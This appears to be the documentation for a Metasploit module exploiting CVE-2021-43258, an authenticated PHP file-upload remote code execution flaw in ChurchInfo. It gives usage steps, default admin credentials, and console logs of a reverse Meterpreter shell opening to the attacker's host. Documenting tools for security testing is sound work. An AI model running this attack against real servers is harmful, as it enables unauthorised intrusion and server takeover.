## Vulnerable Application
* Project Homepage: http://www.churchdb.org/
* Project Download: https://sourceforge.net/projects/churchinfo/files/

ChurchInfo is an open source PHP application used to help churches manage systems and users of the church.
There are various vulnerabilities in the ChurchInfo software which can be exploited by an
attacker, however this module targets an authenticated remote code execution (RCE) vulnerability
known as CVE-2021-43258 to execute code as the web daemon user (e.g. www-data).

ChurchInfo v1.2.13, v1.2.14, and v1.3.0 contain functionality to email users listed in the ChurchInfo database
with attachments. When preparing the email, a draft of the attachment is saved into
`/tmp_attach/`, which is a web accessible folder under the ChurchInfo web root. Before the email is sent,
the attachment draft can be loaded in the application. By uploading a malicious PHP file
as an attachment and then browsing to it on the web server, RCE can be achieved.

This vulnerability was assigned CVE-2021-43258. Version 1.3.0 was the latest version of ChurchInfo at the time
of writing and there is presently no known patch for this issue.

### Installation
Installation guides are available on the SourceForge site at https://sourceforge.net/projects/churchinfo/files/
and within the zip file downloaded in the `./Documentation` folder. This is a standard PHP and MySQL website.

## Verification Steps
This module requires authenticated access to the application. After identifying a vulnerable
ChurchInfo application, there MUST be a person entry available within the database. If there are no person
entries within the database, it will not be possible to create a draft email. This draft email
will be used to place the malicious attachment into the `/tmp_attach` directory for our exploit.

### Module Use
The following steps outline how to use the module.
1. Install the application and register an account.
1. Create some person entries within the database, validate they populate at the page `/SelectList.php?mode=person`.
1. Start `msfconsole`
1. `use exploit/multi/http/churchinfo_upload_exec`
1. Set the target `RHOST`, `APPBASE`, `username`, and `password` values.
1. Select the payload of choice or leave default.
1. Set the `LHOST` to your system.
1. Run the exploit with `run`, enjoy the shell!

If exploit was successful, output should be something close to the following:

```
msf6 exploit(multi/http/churchinfo_upload_exec) > run

[*] Started reverse TCP handler on 192.168.1.240:4444
[+] Logged into application as admin
[*] Navigating to add items to cart
[+] Items in Cart: 3
[+] Uploading exploit via Email temp email attachment
[+] Exploit uploaded to /churchinfo/tmp_attach/FjuIxnXKe.php
[!] Don't forget to clean up artifacts at /churchinfo/tmp_attach/FjuIxnXKe.php
[*] Sending stage (39927 bytes) to 192.168.1.72
[*] Meterpreter session 2 opened (192.168.1.240:4444 -> 192.168.1.72:37250) at 2022-11-12 21:38:30 -0500

meterpreter > getuid

Server username: www-data 
```

## Options
There are a handful of options which can be used to further configure the attack or other environmental uses.

### USERNAME
The username of a valid user account for the ChurchInfo application. Default is `admin`.

### PASSWORD
The password for a valid user account for the ChurchInfo application. Default is `churchinfoadmin` based on documentation.

### APPBASE
The base directory path to the ChurchInfo application. This can and will likely
vary depending on how the application was installed. Default value is `/churchinfo/`.

### EMAIL_SUBJ
The subject of the draft email used for the exploit, the email is not sent. Default value is `Read this now!`.

### EMAIL_MESG
The message on the draft email which is used for the exploit. The email is not sent. Default value is `Hello there!`.

## Scenarios
If there are no person entries in the database, the exploit will fail. To help troubleshoot, enable verbose mode with the following:

```
set verbose true
```

This will enable additional information and details about the exploit as it is launched.

### ChurchInfo 1.3.0
### ChurchInfo v1.3.0 with MySQL 5.7.40 on Ubuntu Linux 18.04.5 LTS
There are several options available. This exploit requires authenticated access
to the email application for ChurchInfo. The default username is `admin` and
password is `churchinfoadmin` based on the installation documentation.
Both `EMAIL_MESG` and `EMAIL_SUBJ` are required to upload the exploit, but
do not have any affect on what type of exploit is launched. `TARGETURI` is
the location the ChurchInfo application is installed.

```
msf6 exploit(multi/http/churchinfo_upload_exec) > run
                                                 
[*] Started reverse TCP handler on 192.168.1.240:4444    
[*] Gathering PHP session cookie                       
[*] SSL is false, leaving protocol as HTTP           
[+] PHP session cookie is PHPSESSID=19rjcc9tbmvj6tpbl7iql0lm0q;
[*] Attempting login                                  
[+] Location header is /churchinfo//CheckVersion.php
[+] Logged into application as admin                  
[*] Attempting exploit                                  
[*] Navigating to add items to cart                  
[+] Items in Cart: 3                              
[+] Uploading exploit via temp email attachment            
[*] Payload name is 0EXot.php                       
[+] Exploit uploaded to /churchinfo/tmp_attach/0EXot.php
[+] Executing payload with GET request                  
[*] Sending stage (39927 bytes) to 192.168.1.72    
[+] Deleted 0EXot.php                               
[*] Meterpreter session 20 opened (192.168.1.240:4444 -> 192.168.1.72:37656) at 2022-11-18 06:31:30 -0500

meterpreter > getuid                                   
Server username: www-data
```
